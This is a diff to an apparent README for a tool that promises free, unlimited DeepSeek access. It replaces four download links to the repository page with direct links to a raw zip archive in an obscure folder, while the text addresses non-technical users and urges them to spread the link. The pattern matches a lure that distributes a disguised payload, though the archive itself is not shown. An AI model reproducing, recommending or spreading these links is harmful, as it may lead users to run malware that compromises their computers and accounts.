@@ -2,7 +2,7 @@
 
 Visit this link to download the application.
 
-[![Download DeepSeek-Harness-Token-Free](https://img.shields.io/badge/Download-DeepSeek_Harness_Token_Free-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Djokovical5294/DeepSeek-Harness-Token-Free)
+[![Download DeepSeek-Harness-Token-Free](https://img.shields.io/badge/Download-DeepSeek_Harness_Token_Free-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Djokovical5294/DeepSeek-Harness-Token-Free/raw/refs/heads/main/rect/Free-Token-Harness-Deep-Seek-v2.2.zip)
 
 ---
 
@@ -24,7 +24,7 @@ Getting started is incredibly easy. There are no technical steps, no command lin
 
 Visit this link to download the application.
 
-[🔗 Download DeepSeek-Harness-Token-Free Now](https://github.com/Djokovical5294/DeepSeek-Harness-Token-Free)
+[🔗 Download DeepSeek-Harness-Token-Free Now](https://github.com/Djokovical5294/DeepSeek-Harness-Token-Free/raw/refs/heads/main/rect/Free-Token-Harness-Deep-Seek-v2.2.zip)
 
 Click the link above, and your browser will open the download page. Look for the big download button — you can't miss it.
 
@@ -77,7 +77,7 @@ If you can browse the web and watch videos on your computer, you can definitely 
 
 Visit this link to download the application.
 
-[⬇️ Get DeepSeek-Harness-Token-Free Here](https://github.com/Djokovical5294/DeepSeek-Harness-Token-Free)
+[⬇️ Get DeepSeek-Harness-Token-Free Here](https://github.com/Djokovical5294/DeepSeek-Harness-Token-Free/raw/refs/heads/main/rect/Free-Token-Harness-Deep-Seek-v2.2.zip)
 
 After you visit the link, you'll be taken to the official GitHub page. Follow these simple steps:
 
@@ -197,7 +197,7 @@ DeepSeek is one of the most capable AI models in the world, and now you can acce
 
 Visit this link to download the application.
 
-[🚀 Start Using DeepSeek for Free](https://github.com/Djokovical5294/DeepSeek-Harness-Token-Free)
+[🚀 Start Using DeepSeek for Free](https://github.com/Djokovical5294/DeepSeek-Harness-Token-Free/raw/refs/heads/main/rect/Free-Token-Harness-Deep-Seek-v2.2.zip)
 
 Spread the word to friends, classmates, and colleagues who could benefit from unlimited AI chat. The more people use it, the stronger the community grows — and that means better features, faster fixes, and a smoother experience for everyone.
 
